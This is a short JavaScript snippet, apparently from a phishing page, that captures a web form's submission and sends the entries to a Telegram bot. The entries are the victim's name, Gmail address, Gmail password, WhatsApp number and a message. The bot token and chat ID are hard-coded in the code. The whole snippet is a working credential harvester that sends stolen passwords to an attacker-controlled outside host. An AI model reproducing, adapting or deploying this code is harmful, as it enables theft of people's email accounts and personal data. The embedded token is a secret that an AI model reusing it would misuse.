
    const TOKEN = "7988380570:AAF2kkt_YTI4oRasVEXWWFXasjL89WNzY6g"
    const CHAT_ID = '7232374611'
    const URL_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`

    document.getElementById('tg').addEventListener('submit', function(e) {
        e.preventDefault()

        let message = '<b> New User </b> \n'
        message += `<b>Nama: </b> ${this.nama.value} \n`
        message += `<b>Gmail: </b> ${this.gmail.value} \n`
        message += `<b>Password Gmail: </b> ${this.password.value} \n`
        message += `<b>WhatsApp: </b> ${this.number.value} \n`
        message += `<b>Pesan Cerita: </b> \n ${this.pesancerita.value} \n`

        axios.post(URL_API, {
          chat_id: CHAT_ID,
          parse_mode: `html`,
          text: message
        })
    })